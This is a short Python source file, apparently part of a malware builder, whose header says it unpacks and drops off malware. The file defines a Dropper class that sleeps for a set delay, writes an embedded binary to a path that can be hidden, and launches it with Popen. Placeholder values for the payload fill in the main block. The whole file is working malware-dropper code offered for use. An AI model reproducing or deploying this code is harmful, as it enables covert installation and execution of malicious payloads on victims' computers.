# Date: 08/31/2018
# Author: Pure-L0G1C
# Description: Unpacks and drops off malware

from time import sleep

class Dropper(object):

    def __init__(self, name, binary, delay, hide=False):
        self.binary = binary
        self.delay = delay
        self.name = name
        self.hide = hide
        self.path = None

    def unpack(self):
        from lib.file import File
        from lib.pathfinder import Finder
        self.path = Finder.find() + self.name if self.hide else self.name
        print('Path:', self.path)
        File.write(self.path, self.binary)

    def execute(self):
        from subprocess import Popen
        cmd = '{}'.format(self.path)
        Popen(cmd.split())

    def start(self):
        sleep(self.delay)
        self.unpack()
        self.execute()

if __name__ == '__main__':
    Dropper(data_name, data_binary, data_delay, data_hide).start()
